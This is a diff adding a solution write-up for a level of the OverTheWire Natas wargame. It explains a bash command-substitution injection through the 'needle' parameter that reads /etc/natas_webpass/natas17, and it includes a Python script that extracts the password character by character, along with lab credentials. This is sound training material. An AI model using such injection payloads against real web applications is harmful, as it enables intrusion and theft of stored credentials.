@@ -248,6 +248,7 @@ The result will give us the information about whether the password begins with '
 
 Below is a python implementation with full dictionary:
 ```python
+# scripts/level_16.py
 import string
 import requests
 
@@ -279,9 +280,69 @@ The result:
 passwd: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
 ### solution
-`$()` \
-`tr` \
-`expr substr <str> start length`
+Check the source code. Note the differnce between level 17 and level 10: \
+(i) the `$key` is wrapped in double quotes. \
+(ii) we can not use `` ` ``, `\`, `'`, `"` in addtion to `;`, `|`, `$`, `[`, `]`
+
+![Level 17 - 1](images/level_17-1.png)
+
+Luckily, we can still use [Command Substitution](http://www.tldp.org/LDP/abs/html/commandsub.html) (`$()`) and [Bash String Manipulation Operations](https://www.tldp.org/LDP/abs/html/string-manipulation.html).
+
+__Observation A__: Given a character `<ch>`, we can use the command `grep -i "<ch>" dictionary.txt` to check whether `<ch>` is alphabetic.
+
+__Observation B__: Given a password string `s`, let `s[i]` be its ith character. (i) If `s[i]` is alphabetic, and for a letter `c` in `a-zA-Z`, replacing all `c` in `s` with `_` makes `s[i]` not alphabetic, then `s[i]` equals `c`. (ii) Similarly, if `s[i]` is not alphabetic (which in our case will be numeric), and for a digit `d` in `0-9`, replacing all `d` in `s` with `a` makes `s[i]` alphabetic, then `s[i]` equals `d`.
+
+Combining Observation A and B, we can use following command to determine the characters in the password string:
+```
+grep -i "$(expr substr $(tr <sc> <dc> < /etc/natas_webpass/natas17) <pos> 1)" dictionary.txt
+```
+`<sc>`: the character to be replaced \
+`<dc>`: the new character \
+`<pos>`: the postion of the character being tested (one based)
+
+The above command transforms the password string, extracts the character at postion `<pos>` from the transformed string, and tests whether the character is alphabetic.
+
+A python implementation:
+```python
+# scripts/level_17.py
+import string
+import requests
+
+auth_username = 'natas16'
+auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+url = 'http://natas16.natas.labs.overthewire.org/'
+needle = '$(expr substr $(tr {} {} < /etc/natas_webpass/natas17) {} 1)'
+passwd = ''
+empty_pre_str = '<pre>\n</pre>'
+
+def is_letter_after_trans(src_set, dst_set, pos):
+    params = {
+        'needle': needle.format(src_set, dst_set, pos)
+    }
+    r = requests.get(url, params=params, auth=(auth_username,auth_password))
+    if empty_pre_str in r.text:
+        return False
+    else:
+        return True
+
+for i in range(1, 33):
+    if is_letter_after_trans('_', '_', i):
+        # postion [i] is a letter
+        for char in string.ascii_letters:
+            if not is_letter_after_trans(char, '_', i):
+                passwd += char
+                break
+    else:
+        # position [i] is a digit
+        for char in string.digits:
+            if is_letter_after_trans(char, 'a', i):
+                passwd += char
+                break
+    print(passwd)
+```
+
+The result:
+![Level 17 - 2](images/level_17-2.png)
 
 ## level 18
 passwd: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
